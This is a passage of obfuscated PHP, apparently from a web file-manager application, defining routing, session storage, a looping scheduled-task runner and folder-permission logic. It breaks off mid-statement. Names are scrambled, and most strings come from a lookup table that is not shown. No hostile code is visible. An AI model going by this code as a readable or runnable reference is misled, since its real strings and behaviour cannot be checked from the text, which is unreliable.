<?php
 goto cöéèÜ³ÓÛ; dÌ¸‡ëŠˆá: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\x6e\x79" => "\x5b\136\57\135\53", "\x3a\156\165\x6d" => "\x5b\60\x2d\x39\x5d\53", "\72\141\154\x6c" => "\56\x2a"); public static $errorCallback; public static function __callstatic($î§¤Ëïù, $ß·ú´¨˜) { $å÷“¸Ä¦ =& $_SERVER[ì™ı‰º¯]; if ($î§¤Ëïù == $å÷“¸Ä¦[1615]) { $¹¿†ï»… = array_map($å÷“¸Ä¦[1616], $ß·ú´¨˜[0]); $€…×ò€ = strpos($ß·ú´¨˜[1], $å÷“¸Ä¦[8]) === 0 ? $ß·ú´¨˜[1] : $å÷“¸Ä¦[8] . $ß·ú´¨˜[1]; $œÅŠÆ° = $ß·ú´¨˜[2]; } else { $¹¿†ï»… = null; $€…×ò€ = strpos($ß·ú´¨˜[0], $å÷“¸Ä¦[8]) === 0 ? $ß·ú´¨˜[0] : $å÷“¸Ä¦[8] . $ß·ú´¨˜[0]; $œÅŠÆ° = $ß·ú´¨˜[1]; } array_push(self::$maps, $¹¿†ï»…); array_push(self::$routes, $€…×ò€); array_push(self::$methods, strtoupper($î§¤Ëïù)); array_push(self::$callbacks, $œÅŠÆ°); } public static function error($Â¸¥¬£¤) { self::$errorCallback = $Â¸¥¬£¤; } public static function haltOnMatch($ø¸Öæ´È = true) { self::$halts = $ø¸Öæ´È; } public static function dispatch() { $Ùæˆñ†° =& $_SERVER[ì™ı‰º¯]; $İé£óÀ = parse_url($_SERVER[$Ùæˆñ†°[1617]], PHP_URL_PATH); $ö±ˆ€ş¼ = $_SERVER[$Ùæˆñ†°[159]]; $„¦‹ôş± = array_keys(static::$patterns); $ÆâÃŞÕ = array_values(static::$patterns); $›’›ÖÈä = !1; self::$routes = preg_replace($Ùæˆñ†°[1275], $Ùæˆñ†°[8], self::$routes); if (in_array($İé£óÀ, self::$routes)) { $ëäÌ›å© = array_keys(self::$routes, $İé£óÀ); foreach ($ëäÌ›å© as $ÀÂå£·Ø) { if (self::$methods[$ÀÂå£·Ø] == $ö±ˆ€ş¼ || self::$methods[$ÀÂå£·Ø] == $Ùæˆñ†°[1618] || in_array($ö±ˆ€ş¼, self::$maps[$ÀÂå£·Ø])) { $›’›ÖÈä = !0; if (!is_object(self::$callbacks[$ÀÂå£·Ø])) { $âøıª¿Ä = explode($Ùæˆñ†°[8], self::$callbacks[$ÀÂå£·Ø]); $¬¨ÅË²× = end($âøıª¿Ä); $ÌªÌàô« = explode($Ùæˆñ†°[1207], $¬¨ÅË²×); $’àôğâË = new $ÌªÌàô«[0](); $’àôğâË->{$ÌªÌàô«[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ÀÂå£·Ø]); if (self::$halts) { return; } } } } } else { $º¹Ü½ğ = 0; foreach (self::$routes as $ÀÂå£·Ø) { if (strpos($ÀÂå£·Ø, $Ùæˆñ†°[4]) !== !1) { $ÀÂå£·Ø = str_replace($„¦‹ôş±, $ÆâÃŞÕ, $ÀÂå£·Ø); } if (preg_match($Ùæˆñ†°[1619] . $ÀÂå£·Ø . $Ùæˆñ†°[1620], $İé£óÀ, $êÜ§Åæœ)) { if (self::$methods[$º¹Ü½ğ] == $ö±ˆ€ş¼ || self::$methods[$º¹Ü½ğ] == $Ùæˆñ†°[1618] || !empty(self::$maps[$º¹Ü½ğ]) && in_array($ö±ˆ€ş¼, self::$maps[$º¹Ü½ğ])) { $›’›ÖÈä = !0; array_shift($êÜ§Åæœ); if (!is_object(self::$callbacks[$º¹Ü½ğ])) { $âøıª¿Ä = explode($Ùæˆñ†°[8], self::$callbacks[$º¹Ü½ğ]); $¬¨ÅË²× = end($âøıª¿Ä); $ÌªÌàô« = explode($Ùæˆñ†°[1207], $¬¨ÅË²×); $’àôğâË = new $ÌªÌàô«[0](); if (!method_exists($’àôğâË, $ÌªÌàô«[1])) { echo $Ùæˆñ†°[1621]; } else { call_user_func_array(array($’àôğâË, $ÌªÌàô«[1]), $êÜ§Åæœ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$º¹Ü½ğ], $êÜ§Åæœ); if (self::$halts) { return; } } } } $º¹Ü½ğ++; } } if ($›’›ÖÈä == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Ñ×ÛèšÑ =& $_SERVER[ì™ı‰º¯]; header($_SERVER[$Ñ×ÛèšÑ[1622]] . $Ñ×ÛèšÑ[1623]); echo $Ñ×ÛèšÑ[1624]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Ùæˆñ†°[1617]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ÜĞ”§µÂ =& $_SERVER[ì™ı‰º¯]; static $ê•µ–á = false; if ($ê•µ–á) { return $ê•µ–á; } $Ç¶éÆµÂ = $GLOBALS[$ÜĞ”§µÂ[6]][$ÜĞ”§µÂ[349]]; self::$sessionTime = $Ç¶éÆµÂ[$ÜĞ”§µÂ[1625]]; $Š¥²û ´ = isset($GLOBALS[$ÜĞ”§µÂ[1626]]) ? $GLOBALS[$ÜĞ”§µÂ[1626]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($Š¥²û ´)) { self::$sessionSign = Cookie::get($Š¥²û ´); } else { self::$sessionSign = guid(); } } Cookie::setSafe($Š¥²û ´, self::$sessionSign, self::$sessionTime); $şé¸“ÎÂ = $Ç¶éÆµÂ[$ÜĞ”§µÂ[1627]]; $ß¢Ó¬ûğ = $Ç¶éÆµÂ[$şé¸“ÎÂ]; $§¿ñ° = $Ç¶éÆµÂ[$ÜĞ”§µÂ[824]]; switch ($şé¸“ÎÂ) { case $ÜĞ”§µÂ[21]: self::$handle = Model($ÜĞ”§µÂ[825]); break; case $ÜĞ”§µÂ[826]: self::$handle = new CacheRedis($ß¢Ó¬ûğ, $§¿ñ°); break; case $ÜĞ”§µÂ[827]: self::$handle = new CacheMemcached($ß¢Ó¬ûğ, $§¿ñ°); break; case $ÜĞ”§µÂ[200]: $ß¢Ó¬ûğ[$ÜĞ”§µÂ[84]] = $ß¢Ó¬ûğ[$ÜĞ”§µÂ[84]] . $ÜĞ”§µÂ[1628]; self::$handle = new CacheFile($ß¢Ó¬ûğ, $§¿ñ°); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ê•µ–á = new self(); return $ê•µ–á; } public static function getBySign($”•ŒŞûå) { $Ÿ‰á€ªÏ = self::$handle->get($”•ŒŞûå); $Ÿ‰á€ªÏ = unserialize($Ÿ‰á€ªÏ); return is_array($Ÿ‰á€ªÏ) ? $Ÿ‰á€ªÏ : array(); } public static function setBySign($”Ö†ùÊ€, $šŒÓÖğ—) { CacheLock::lock($”Ö†ùÊ€); self::$handle->set($”Ö†ùÊ€, serialize($šŒÓÖğ—), self::$sessionTime); CacheLock::unlock($”Ö†ùÊ€); } public static function sign($´á·şÒ = false) { $´á·şÒ && (self::$sessionSign = $´á·şÒ); self::init(); return self::$sessionSign; } public static function set($ğšŞĞâ, $æŞ°‚à” = false) { self::init(); if (is_array($ğšŞĞâ)) { foreach ($ğšŞĞâ as $üÛ–íÚ† => $Öä’½ò§) { array_set_value(self::$data, $üÛ–íÚ†, $Öä’½ò§); } } else { array_set_value(self::$data, $ğšŞĞâ, $æŞ°‚à”); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ƒ—™ƒ“ = false) { self::init(); if (!$ƒ—™ƒ“) { return self::$data; } return array_get_value(self::$data, $ƒ—™ƒ“); } public static function remove($½‘„ƒÕ…) { self::init(); unset(self::$data[$½‘„ƒÕ…]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ì™ı‰º¯][829])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $õ’–†Ç† =& $_SERVER[ì™ı‰º¯]; if (self::valueGet($õ’–†Ç†[745]) != $õ’–†Ç†[88]) { return; } if (self::valueGet($õ’–†Ç†[1629]) == $õ’–†Ç†[88]) { $ó£¹òÔ² = self::valueGet($õ’–†Ç†[1630]); if (time() - $ó£¹òÔ² > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$õ’–†Ç†[1631]] = 1; self::valueSet($õ’–†Ç†[1629], $õ’–†Ç†[88]); self::log($õ’–†Ç†[1632] . ACTION . $õ’–†Ç†[1633]); Session::$data = array(); Session::$sessionSign = $õ’–†Ç†[12]; $GLOBALS[$õ’–†Ç†[494]] = 1; Hook::bind($õ’–†Ç†[1634], $õ’–†Ç†[1635]); $€•¢Ë¥ş = 0; while (!0) { self::cacheClear(); if (self::valueGet($õ’–†Ç†[745]) != $õ’–†Ç†[88]) { self::valueSet($õ’–†Ç†[1629], $õ’–†Ç†[198]); self::log($õ’–†Ç†[1636]); die; } $Åï¨½–ı = time(); if ($Åï¨½–ı - $€•¢Ë¥ş >= 60) { self::valueSet(array($õ’–†Ç†[1629] => $õ’–†Ç†[88], $õ’–†Ç†[1630] => $Åï¨½–ı), !1); $€•¢Ë¥ş = $Åï¨½–ı; } if (!file_exists(USER_SYSTEM . $õ’–†Ç†[1637])) { self::valueSet(array($õ’–†Ç†[1629] => $õ’–†Ç†[198], $õ’–†Ç†[745] => $õ’–†Ç†[198]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $ºıĞ­ê =& $_SERVER[ì™ı‰º¯]; http_close(); self::valueSet($ºıĞ­ê[745], $ºıĞ­ê[198]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ºıĞ­ê[1629] => $ºıĞ­ê[198], $ºıĞ­ê[745] => $ºıĞ­ê[88]), !1); } public static function taskSwitch() { $“´ùª›‚ =& $_SERVER[ì™ı‰º¯]; $Ä§İÉæ = self::valueGet($“´ùª›‚[745]) == $“´ùª›‚[88] ? $“´ùª›‚[198] : $“´ùª›‚[88]; self::valueSet($“´ùª›‚[745], $Ä§İÉæ); } public static function shutdownEvent() { $ğ¯Ğ»õ‰ =& $_SERVER[ì™ı‰º¯]; self::valueSet($ğ¯Ğ»õ‰[1629], $ğ¯Ğ»õ‰[198]); self::log($ğ¯Ğ»õ‰[1638]); } public static function config($‚ôÔœ ø, $ş–«Êº¹) { self::valueSet($_SERVER[ì™ı‰º¯][745], $‚ôÔœ ø); } private static function taskRunAll() { $¦æïÑš¬ =& $_SERVER[ì™ı‰º¯]; $Ö“Ó·¹Æ = timeFloat(); $¨Ç ï´ = Model($¦æïÑš¬[1639])->listData(); $Šê­ÓèŞ = count($¨Ç ï´); for ($Ê²‰¿ = 0; $Ê²‰¿ < $Šê­ÓèŞ; $Ê²‰¿++) { $³ËÀÙ© = $¨Ç ï´[$Ê²‰¿]; if (!$³ËÀÙ©[$¦æïÑš¬[399]] || $³ËÀÙ©[$¦æïÑš¬[1640]] != $¦æïÑš¬[88]) { continue; } if (!self::taskTimeCheck($³ËÀÙ©)) { continue; } self::taskRun($³ËÀÙ©); } Hook::trigger($¦æïÑš¬[1641]); self::taskQueueRun($Ö“Ó·¹Æ); } private static function taskQueueRun($à†Ğë¢è) { $ï­»ª“á = 10; while (!0) { $•”Œ¸ïŠ = TaskQueue::run(); if ($•”Œ¸ïŠ === !1) { break; } if (timeFloat() - $à†Ğë¢è >= $ï­»ª“á) { break; } } } private static function taskTimeCheck($ŒÚöÆ×ƒ) { $ƒÃ³øÃÚ =& $_SERVER[ì™ı‰º¯]; $ÆÀ¾Õø = json_decode($ŒÚöÆ×ƒ[$ƒÃ³øÃÚ[180]], !0); $¯‘ÁÊ¸ì = intval($ŒÚöÆ×ƒ[$ƒÃ³øÃÚ[1630]]); $¨¦ØÃÑ = strtotime($ƒÃ³øÃÚ[1642] . $ÆÀ¾Õø[$ƒÃ³øÃÚ[1643]] . $ƒÃ³øÃÚ[1644]) - strtotime($ƒÃ³øÃÚ[1645]); $Ğ¥×¦‡„ = time() - strtotime(date($ƒÃ³øÃÚ[1646]) . $ƒÃ³øÃÚ[1647]); $şÊ©Íó° = $Ğ¥×¦‡„ >= $¨¦ØÃÑ && $Ğ¥×¦‡„ <= $¨¦ØÃÑ + 3600; switch ($ÆÀ¾Õø[$ƒÃ³øÃÚ[33]]) { case $ƒÃ³øÃÚ[1648]: if (time() - $¯‘ÁÊ¸ì < 3600 * 24 * 30) { return !1; } if ($ÆÀ¾Õø[$ƒÃ³øÃÚ[1648]] == date($ƒÃ³øÃÚ[1649]) && $şÊ©Íó°) { return !0; } break; case $ƒÃ³øÃÚ[1650]: if (time() - $¯‘ÁÊ¸ì < 3600 * 24 * 7) { return !1; } $åº³ù¼Ô = date($ƒÃ³øÃÚ[1651]) == 0 ? 7 : date($ƒÃ³øÃÚ[1651]); if ($ÆÀ¾Õø[$ƒÃ³øÃÚ[1650]] == $åº³ù¼Ô && $şÊ©Íó°) { return !0; } break; case $ƒÃ³øÃÚ[1643]: if (time() - $¯‘ÁÊ¸ì < 3600 * 24) { return !1; } if ($şÊ©Íó°) { return !0; } break; case $ƒÃ³øÃÚ[1652]: if (time() - $¯‘ÁÊ¸ì >= floatval($ÆÀ¾Õø[$ƒÃ³øÃÚ[1652]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $øåúù÷È =& $_SERVER[ì™ı‰º¯]; static $ƒøŠÕÃı = 0; $äÎšùÄÙ = 300; if (!$ƒøŠÕÃı) { $ƒøŠÕÃı = time(); } if (time() - $ƒøŠÕÃı < $äÎšùÄÙ) { return; } $ƒøŠÕÃı = time(); $¼ÙæĞ«  = Model($øåúù÷È[504])->db($øåúù÷È[12]); if ($¼ÙæĞ« ) { $¼ÙæĞ« ->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($øåúù÷È[1653], $øåúù÷È[1654]); die; } } public static function taskRun($œù‰»åñ) { $…€Ó† =& $_SERVER[ì™ı‰º¯]; self::log($…€Ó†[1655] . $œù‰»åñ[$…€Ó†[399]] . $…€Ó†[1656] . $œù‰»åñ[$…€Ó†[32]] . $…€Ó†[1657] . $œù‰»åñ[$…€Ó†[1658]]); Model($…€Ó†[1639])->run($œù‰»åñ[$…€Ó†[399]]); $¤úŒ·Àö = timeFloat(); $Ê áÂ‡ = $…€Ó†[12]; switch ($œù‰»åñ[$…€Ó†[33]]) { case $…€Ó†[307]: $°ˆÆœƒ¤ = url_request($œù‰»åñ[$…€Ó†[1658]], $…€Ó†[230], !1, !1, !1, !1, 10); if ($°ˆÆœƒ¤[$…€Ó†[745]]) { $Ê áÂ‡ = strlen($°ˆÆœƒ¤[$…€Ó†[1201]]); } break; case $…€Ó†[229]: $Ê áÂ‡ = Hook::apply($œù‰»åñ[$…€Ó†[1658]]); default: break; } Model($…€Ó†[1659])->add(array($…€Ó†[1660] => $…€Ó†[12], $…€Ó†[1661] => $…€Ó†[198], $…€Ó†[33] => $…€Ó†[1662] . $œù‰»åñ[$…€Ó†[399]], $…€Ó†[1663] => json_encode(array($…€Ó†[32] => $œù‰»åñ[$…€Ó†[32]], $…€Ó†[1664] => timeFloat() - $¤úŒ·Àö, $…€Ó†[293] => $Ê áÂ‡)))); $÷¹„Ñ©ä = $Ê áÂ‡ ? $…€Ó†[1665] . $Ê áÂ‡ : $…€Ó†[12]; self::log($…€Ó†[1666] . $œù‰»åñ[$…€Ó†[399]] . $…€Ó†[164] . $÷¹„Ñ©ä); return !0; } private static function valueGet($¤€šˆš) { $Û¦ËÎ²¸ =& $_SERVER[ì™ı‰º¯]; $ñ‰æï–ô = $Û¦ËÎ²¸[1667]; $‚­ĞÇ˜ = Model($Û¦ËÎ²¸[435])->get($¤€šˆš, $ñ‰æï–ô); if (is_null($‚­ĞÇ˜)) { Model($Û¦ËÎ²¸[435])->set($Û¦ËÎ²¸[745], $Û¦ËÎ²¸[88], $ñ‰æï–ô); Model($Û¦ËÎ²¸[435])->set($Û¦ËÎ²¸[1629], $Û¦ËÎ²¸[198], $ñ‰æï–ô); $‚­ĞÇ˜ = Model($Û¦ËÎ²¸[435])->get($¤€šˆš, $ñ‰æï–ô); } return $‚­ĞÇ˜; } private static function valueSet($óİ”Î²¡, $¢­»á÷) { $Š¶°ÑÙ÷ =& $_SERVER[ì™ı‰º¯]; $–å’«İ = $Š¶°ÑÙ÷[1668]; CacheLock::lock($–å’«İ); $ï¿ØÌ´Ú = Model($Š¶°ÑÙ÷[435])->set($óİ”Î²¡, $¢­»á÷, $Š¶°ÑÙ÷[1667]); CacheLock::unlock($–å’«İ); return $ï¿ØÌ´Ú; } protected static function log($ËÌÔ¥¿‡) { write_log($ËÌÔ¥¿‡, $_SERVER[ì™ı‰º¯][1654]); } private static function cacheClear() { $¹û¿ÅË =& $_SERVER[ì™ı‰º¯]; Cache::clearMemory(Model($¹û¿ÅË[435])->cacheKey($¹û¿ÅË[1667])); Cache::clearMemory(Model($¹û¿ÅË[435])->cacheKey($¹û¿ÅË[1669])); Model($¹û¿ÅË[1639])->cacheClear(); self::closeDatabase(); } } goto a‡Š›’ªùÖ; f¥”ºšæÙö: class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\165\x72\x63\x65\137\x61\x75\x74\x68"; public function getAuth($åİíµÌó) { $ƒó‡´Åì =& $_SERVER[ì™ı‰º¯]; $ıÑØ¾¼„ = $this->sourceAuthSelect($åİíµÌó); $«ó¿¾´ƒ = array(); $‰ïøÄÄ« = array(); $ğ¼ê‡° = 2 << 25; foreach ($ıÑØ¾¼„ as $êàŸ»•à) { $ÄĞÆˆ®ü = Model($ƒó‡´Åì[498])->listData($êàŸ»•à[$ƒó‡´Åì[1963]]); if (!$ÄĞÆˆ®ü) { continue; } $«ó¿¾´ƒ[] = $êàŸ»•à; $ø‹Â“åŸ = 0; if ($êàŸ»•à[$ƒó‡´Åì[411]] == SourceModel::TYPE_GROUP) { $ø‹Â“åŸ = $ğ¼ê‡° * 2; } if ($êàŸ»•à[$ƒó‡´Åì[411]] == SourceModel::TYPE_USER) { $ø‹Â“åŸ = $ğ¼ê‡°; } if ($êàŸ»•à[$ƒó‡´Åì[411]] == SourceModel::TYPE_USER && $êàŸ»•à[$ƒó‡´Åì[496]] == $ƒó‡´Åì[198]) { $ø‹Â“åŸ = 0; } $‰ïøÄÄ«[] = $ÄĞÆˆ®ü[$ƒó‡´Åì[413]] + $ø‹Â“åŸ; } array_multisort($‰ïøÄÄ«, SORT_DESC, $«ó¿¾´ƒ); return $«ó¿¾´ƒ; } public function sourceAuthSelect($Œ½™·è÷) { $£Ø æä¼ =& $_SERVER[ì™ı‰º¯]; static $µµ¾ãÒá = array(); $ıíß±á· = is_array($Œ½™·è÷) ? !1 : !0; if ($ıíß±á·) { $Œ½™·è÷ = array($Œ½™·è÷); } $ùö®·ğˆ = array(); foreach ($Œ½™·è÷ as $¯‹¡×¯‚) { if (isset($µµ¾ãÒá[$¯‹¡×¯‚])) { $ùö®·ğˆ[$¯‹¡×¯‚] = $µµ¾ãÒá[$¯‹¡×¯‚]; } } if (count($ùö®·ğˆ) == count($Œ½™·è÷)) { return $ıíß±á· ? $ùö®·ğˆ[$Œ½™·è÷[0]] : $ùö®·ğˆ; } $¤§šÅŠ— = $£Ø æä¼[2040]; $æŒÏÊ·¨ = array($£Ø æä¼[402] => array($£Ø æä¼[7], $Œ½™·è÷)); $ÓÕØ°í = $this->field($¤§šÅŠ—)->order($£Ø æä¼[399])->where($æŒÏÊ·¨)->select(); $ç¯³Âúì = array_to_keyvalue_group($ÓÕØ°í, $£Ø æä¼[402]); foreach ($Œ½™·è÷ as $¯‹¡×¯‚) { $µµ¾ãÒá[$¯‹¡×¯‚] = $ç¯³Âúì[$¯‹¡×¯‚] ? $ç¯³Âúì[$¯‹¡×¯‚] : array(); } if ($ıíß±á·) { return $ÓÕØ°í; } return $ç¯³Âúì; } public function setAuth($Î—ñÂÅŞ, $ï…Œ»§÷) { $›¹é¡‹’ =& $_SERVER[ì™ı‰º¯]; $É·„³õË = Model($›¹é¡‹’[1338])->sourceInfo($Î—ñÂÅŞ); if (!$É·„³õË) { return !1; } if ($É·„³õË[$›¹é¡‹’[411]] != SourceModel::TYPE_GROUP) { return !1; } $ïİÈ·¢ = 1; $×œÂĞ´å = $É·„³õË[$›¹é¡‹’[496]]; if ($×œÂĞ´å != $ïİÈ·¢) { $®ÚşƒæŠ = array($›¹é¡‹’[1859] => $×œÂĞ´å); $‘²÷÷ = Model($›¹é¡‹’[1949])->field($›¹é¡‹’[1670])->where($®ÚşƒæŠ)->select(); $‘²÷÷ = array_to_keyvalue($‘²÷÷, $›¹é¡‹’[12], $›¹é¡‹’[1670]); } $„Şš§‚º = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $±£Ï­É’ = array(); foreach ($ï…Œ»§÷ as $Œ·è„ù) { if (!in_array($Œ·è„ù[$›¹é¡‹’[411]], $„Şš§‚º)) { show_json(LNG($›¹é¡‹’[2041]), !1); } if ($×œÂĞ´å != $ïİÈ·¢) { if ($Œ·è„ù[$›¹é¡‹’[411]] == SourceModel::TYPE_GROUP) { } if ($Œ·è„ù[$›¹é¡‹’[496]] != 0 && !in_array($Œ·è„ù[$›¹é¡‹’[496]], $‘²÷÷)) { } } if ($Œ·è„ù[$›¹é¡‹’[496]] == 0) { $Œ·è„ù[$›¹é¡‹’[411]] = SourceModel::TYPE_USER; } $±£Ï­É’[] = array($›¹é¡‹’[402] => $Î—ñÂÅŞ, $›¹é¡‹’[411] => intval($Œ·è„ù[$›¹é¡‹’[411]]), $›¹é¡‹’[496] => intval($Œ·è„ù[$›¹é¡‹’[496]]), $›¹é¡‹’[1963] => intval($Œ·è„ù[$›¹é¡‹’[1963]]) ? intval($Œ·è„ù[$›¹é¡‹’[1963]]) : 0, $›¹é¡‹’[2023] => intval($Œ·è„ù[$›¹é¡‹’[2023]]) ? intval($Œ·è„ù[$›¹é¡‹’[2023]]) : -1); } $this->where(array($›¹é¡‹’[417] => $Î—ñÂÅŞ))->delete(); $this->addAll($±£Ï­É’); return !0; } public function authClear($õÓø¢Ü¬) { $‡úìñÁÉ =& $_SERVER[ì™ı‰º¯]; $è‘œĞŒĞ = Model($‡úìñÁÉ[1338])->sourceInfo($õÓø¢Ü¬); $æ×ìô¿Ò = array($õÓø¢Ü¬); if ($è‘œĞŒĞ[$‡úìñÁÉ[410]] == $‡úìñÁÉ[88]) { $•ˆ†á = array($‡úìñÁÉ[580] => array($‡úìñÁÉ[540], $è‘œĞŒĞ[$‡úìñÁÉ[511]] . $õÓø¢Ü¬ . $‡úìñÁÉ[541])); $æ×ìô¿Ò = Model($‡úìñÁÉ[1338])->field($‡úìñÁÉ[417])->where($•ˆ†á)->getField($‡úìñÁÉ[402], !0); $æ×ìô¿Ò[] = $õÓø¢Ü¬; } $this->where(array($‡úìñÁÉ[417] => array($‡úìñÁÉ[418], $æ×ìô¿Ò)))->delete(); return !0; } public function getAllChildren($ÅÇï˜İÏ) { $–‹¥Áˆ‡ =& $_SERVER[ì™ı‰º¯]; $÷ãÜãú = Model($–‹¥Áˆ‡[1338])->sourceInfo($ÅÇï˜İÏ); if ($÷ãÜãú[$–‹¥Áˆ‡[410]] != $–‹¥Áˆ‡[88]) { return $this->sourceListAuth(array($ÅÇï˜İÏ)); } if ($÷ãÜãú[$–‹¥Áˆ‡[411]] != SourceModel::TYPE_GROUP) { return array(); } $‰ñÒ’‡Ñ = 1; $î²®Çö = array($ÅÇï˜İÏ); if ($÷ãÜãú[$–‹¥Áˆ‡[432]] == $–‹¥Áˆ‡[198] && $÷ãÜãú[$–‹¥Áˆ‡[496]] != $‰ñÒ’‡Ñ) { $î²®Çö = $this->groupChidldAllRootSource($÷ãÜãú[$–‹¥Áˆ‡[496]]); } $ü–ê¾× = $this->field($–‹¥Áˆ‡[402])->group($–‹¥Áˆ‡[402])->select(); $ü–ê¾× = array_to_keyvalue($ü–ê¾×, $–‹¥Áˆ‡[12], $–‹¥Áˆ‡[402]); if (!$ü–ê¾×) { return array(); } $ÊÏŸË… = $–‹¥Áˆ‡[2042]; $ŠÃºé·Ç = array($–‹¥Áˆ‡[402] => array($–‹¥Áˆ‡[7], $ü–ê¾×), $–‹¥Áˆ‡[431] => $–‹¥Áˆ‡[198]); $§…Œû½Ù = Model($–‹¥Áˆ‡[821])->field($ÊÏŸË…)->where($ŠÃºé·Ç)->select(); $±É¿„Ëˆ = array($ÅÇï˜İÏ); foreach ($§…Œû½Ù as $ç¤ÒºèÛ) { foreach ($î²®Çö as $¡¡ÌáÓÓ) { $üµş¦¨ó = $–‹¥Áˆ‡[50] . $¡¡ÌáÓÓ . $–‹¥Áˆ‡[50]; $Ü‹®ƒ±  = $ç¤ÒºèÛ[$–‹¥Áˆ‡[511]] . $ç¤ÒºèÛ[$–‹¥Áˆ‡[402]] . $–‹¥Áˆ‡[50]; if (strstr($Ü‹®ƒ± , $üµş¦¨ó)) { $±É¿„Ëˆ[] = $ç¤ÒºèÛ[$–‹¥Áˆ‡[402]]; break; } } } return $this->sourceListAuth($±É¿„Ëˆ); } private function sourceListAuth($ƒ«¼ÀÊ) { $âŒŠäº =& $_SERVER[ì™ı‰º¯]; $¿Ô”›ñ‹ = Model($âŒŠäº[1338])->sourceListInfo($ƒ«¼ÀÊ, !0); $†¾‘®‚Ş = $this->sourceAuthSelect($ƒ«¼ÀÊ); $Šãˆ€ìè = array(); $´ª†ùËÂ = array(); foreach ($¿Ô”›ñ‹ as $îÈœäŠØ) { unset($îÈœäŠØ[$âŒŠäº[456]]); unset($îÈœäŠØ[$âŒŠäº[454]]); unset($îÈœäŠØ[$âŒŠäº[413]]); unset($îÈœäŠØ[$âŒŠäº[87]]); $ıá”ä‚ñ = $†¾‘®‚Ş[$îÈœäŠØ[$âŒŠäº[402]]]; if (!$ıá”ä‚ñ) { continue; } $îÈœäŠØ[$âŒŠäº[2043]] = $this->authTargetInfo($ıá”ä‚ñ); $îÈœäŠØ[$âŒŠäº[509]] = rtrim($îÈœäŠØ[$âŒŠäº[515]], $âŒŠäº[8]) . $âŒŠäº[8] . ltrim($îÈœäŠØ[$âŒŠäº[509]], $âŒŠäº[8]); $Šãˆ€ìè[] = $îÈœäŠØ; $¥¶‘Äğğ = count(explode($âŒŠäº[8], trim($îÈœäŠØ[$âŒŠäº[509]], $âŒŠäº[8]))); $´ª†ùËÂ[] = $¥¶‘Äğğ + ($îÈœäŠØ[$âŒŠäº[33]] == $âŒŠäº[75] ? 0 : 1000); } array_multisort($´ª†ùËÂ, SORT_ASC, $Šãˆ€ìè); return $Šãˆ€ìè; } private function groupChidldAllRootSource($ÖÍ¿ÌÎ) { $¥ÁÊÜä´ =& $_SERVER[ì™ı‰º¯]; $öİ©²À¼ = Model($¥ÁÊÜä´[2044])->groupChildrenAll($ÖÍ¿ÌÎ); $èËİÃóû = array($¥ÁÊÜä´[432] => 0, $¥ÁÊÜä´[496] => array($¥ÁÊÜä´[7], $öİ©²À¼), $¥ÁÊÜä´[411] => SourceModel::TYPE_GROUP); $ô§ßœæ† = Model($¥ÁÊÜä´[821])->field($¥ÁÊÜä´[402])->where($èËİÃóû)->select(); $ô§ßœæ† = array_to_keyvalue($ô§ßœæ†, $¥ÁÊÜä´[12], $¥ÁÊÜä´[402]); return $ô§ßœæ†; } private function authTargetInfo($Ÿ´Ÿœá¢) { $ğÉÆ¡ï› =& $_SERVER[ì™ı‰º¯]; $Œş‡š¶ = array(); $„Æ÷‡çç = array(); $ÊŒö¶â = 2 << 25; foreach ($Ÿ´Ÿœá¢ as $ÈÙÁáÒ) { $²ù·™Ê™ = Model($ğÉÆ¡ï›[498])->listData($ÈÙÁáÒ[$ğÉÆ¡ï›[1963]]); if (!$²ù·™Ê™) { continue; } if ($ÈÙÁáÒ[$ğÉÆ¡ï›[411]] == SourceModel::TYPE_USER) { $ÔÜ™æ½ = Model($ğÉÆ¡ï›[504])->getInfoSimpleOuter($ÈÙÁáÒ[$ğÉÆ¡ï›[496]]); if ($ÔÜ™æ½[$ğÉÆ¡ï›[1670]] == $ğÉÆ¡ï›[1187]) { continue; } if ($ÔÜ™æ½[$ğÉÆ¡ï›[1670]] == $ğÉÆ¡ï›[198]) { $ÔÜ™æ½[$ğÉÆ¡ï›[32]] = LNG($ğÉÆ¡ï›[2045]); } } else { $ÔÜ™æ½ = Model($ğÉÆ¡ï›[512])->getInfoSimple($ÈÙÁáÒ[$ğÉÆ¡ï›[496]]); } if (!$ÔÜ™æ½) { continue; } $ÔÜ™æ½[$ğÉÆ¡ï›[467]] = $²ù·™Ê™; $Œş‡š¶[] = $ÔÜ™æ½; $àğàÀæ¯ = 0; if ($ÈÙÁáÒ[$ğÉÆ¡ï›[411]] == SourceModel::TYPE_GROUP) { $àğàÀæ¯ = $ÊŒö¶â * 2; } if ($ÈÙÁáÒ[$ğÉÆ¡ï›[411]] == SourceModel::TYPE_USER) { $àğàÀæ¯ = $ÊŒö¶â; } if ($ÈÙÁáÒ[$ğÉÆ¡ï›[411]] == SourceModel::TYPE_USER && $ÈÙÁáÒ[$ğÉÆ¡ï›[496]] == $ğÉÆ¡ï›[198]) { $àğàÀæ¯ = 0; } $„Æ÷‡çç[] = $²ù·™Ê™[$ğÉÆ¡ï›[413]] + $àğàÀæ¯; } array_multisort($„Æ÷‡çç, SORT_DESC, 